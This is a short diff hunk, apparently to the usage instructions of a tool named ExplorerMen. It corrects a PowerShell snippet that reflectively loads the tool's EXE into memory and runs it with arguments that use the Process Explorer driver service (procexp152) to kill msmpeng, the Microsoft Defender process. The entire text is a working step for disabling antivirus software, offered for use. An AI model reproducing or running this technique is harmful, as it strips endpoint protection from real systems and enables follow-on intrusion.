@@ -36,7 +36,7 @@ Use reflection from PowerShell:
 $asm = [IO.File]::ReadAllBytes("C:\Users\Windy\source\ExplorerMen\bin\x64\Release\ExplorerMen.exe")
 
 # Use reflection to load it into current process memory space
-[System.Reflection.Assembly]::Load($blob)
+[System.Reflection.Assembly]::Load($asm)
 
 # Launch the app, search for the service name procexp152 and kill process named msmpeng
 [ExplorerMen.Program]::Main("/service:procexp152 /name:msmpeng".Split())
